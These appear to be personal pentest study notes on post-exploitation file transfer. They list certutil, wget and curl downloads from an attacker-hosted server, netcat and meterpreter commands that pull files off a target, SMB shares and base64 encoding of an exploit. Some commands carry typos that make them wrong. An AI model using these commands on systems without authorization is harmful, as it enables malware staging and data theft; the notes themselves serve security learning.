# File Transfers
So what is post exploitation this when we basically consisits of stuff like File transfers, port forwarding, pivoting, maintaining access, Clean up etc.

So to do fle transfers we we will use tools like certutil,ftp,browser,FTP, wget

### File Transfers / Certutil.exe →

Http Server hosting with Python :

```bash
python -m SimpleHTTPServer 80
```

Getting the file on the Winndows machine using certutil

```bash
certutil.exe -urlcache -f link filename
```

### FTP Transfer :

So you can host a FTP server on the attacker machine and then connect to that from victim machine

```bash
python -m pyftpdlib 21 #Host it like this

ftp <AttackIP> #Get it like this
```

### WGET Transfer :

```bash
wget link #Works on linux only though
```

### Metasploit :

If you have a meterpreter shell you can use the built functions on metasploit and upload and download stuff .

```bash
upload filename # To upload filename to the target machine.
download filename # To download filename from the target machine.
```

### Netcat Transer Files :

On the listening end where you wanna receive the file :

```bash
nc -l -p 1234 > filefromtargertbrr
```

From where you wanna send the file :

```bash
nc -w 3 <IP> 1234 < filefromtargertbrr
```

### Curl File Transfer :

Host files using python3 from the attacker machine

```bash
python3 -m http.server 80
```

To download them

```bash
curl http://<YOURIP>:<PORT>/filefromattackerbrr -o fileoutput
```

### SMB Server :

To host stuff on a linux machine,

```bash
sudo smbserver.py Share /folder/youwannashare
```

Get them on the Windows server like :

```powershell
new view \\\\10.10.10.10 # Lists all the shares
dir \\\\10.10.10.10\\Share # List files in the Share
copy \\\\10.10.10.10\\Share # Copy Files from the Share
```

---

Linux

```powershell
smbclient -L 10.10.10.10 #To list shares
smbclient \\\\10.10.10.10\\Share # To connect to the share and then you can download stuff using get
```

### Base64 file transfering :

To turn a file into base 64

```bash
cat exploit.py | base64
```

Turn a command or like a one liner into base64

```bash
echo "Hello" | base64
```

Then turn this Text back to normal text and transfer it to a file in linux we can use :

```bash
echo -n "SGVsbG8K" | base64 -d > file
```